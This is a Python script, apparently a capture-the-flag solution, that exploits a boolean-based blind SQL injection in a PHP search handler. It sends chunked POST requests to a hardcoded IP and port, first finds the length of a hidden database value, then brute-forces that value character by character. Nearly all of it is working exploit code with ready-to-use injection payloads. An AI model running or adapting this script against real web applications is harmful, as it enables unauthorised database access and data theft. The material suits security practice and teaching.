# I tried to change the script to use requests library to send the requests to the server, but I was not able to make it work
# since I'm using the university's network and the server is not accessible from the outside. I tried to use the proxy parameter but it didn't work.

import http.client

connn = "94.237.50.105"
port = 53570

# The following functions are used to send a chunked request to the server
def send_body(payload):
    chunk_size = len(payload.encode('utf-8'))
    chunk_size_hex = hex(chunk_size)[2:]
    body = f"{chunk_size_hex}\r\n{payload}\r\n0\r\n\r\n"
    return body

# The following function sends the request to the server aftet the body is created teh chunked header is needed to exploit the vulnerability
def send_request(payload):
    body = send_body(payload)
    conn = http.client.HTTPConnection(connn, port)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "chunked",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
    }
    conn.request("POST", "/Controllers/Handlers/SearchHandler.php", body=body, headers=headers)
    response = conn.getresponse()
    data = response.read().decode('utf-8')
    conn.close()
    return data

# We get the length of the flag by using the query to get the length of the flag
def exfil_length():
    length = 1
    while True:
        payload = f"search=1' and (SELECT length(group_concat(id || ',' || gamename || ',' || gamedesc)) FROM posts WHERE id = 6) = {length}--"
        resp = send_request(payload)
        if "No post id found." in resp:
            break
        length += 1
    return length

# We get the flag by using the query to get the flag character by character exploing a boolean based SQL injection
def get_flag(length):
    data = ""
    for i in range(1, length+1):
        for j in range(32, 127):
            payload = f"search=1' and (SELECT substr(group_concat(id || ',' || gamename || ',' || gamedesc), {i}, 1) FROM posts WHERE id = 6) = '{chr(j)}'--"
            resp = send_request(payload)
            if "No post id found." in resp:
                data += chr(j)
                print(data)
                break
    return data

length = exfil_length()
flag = get_flag(length)
print(flag)
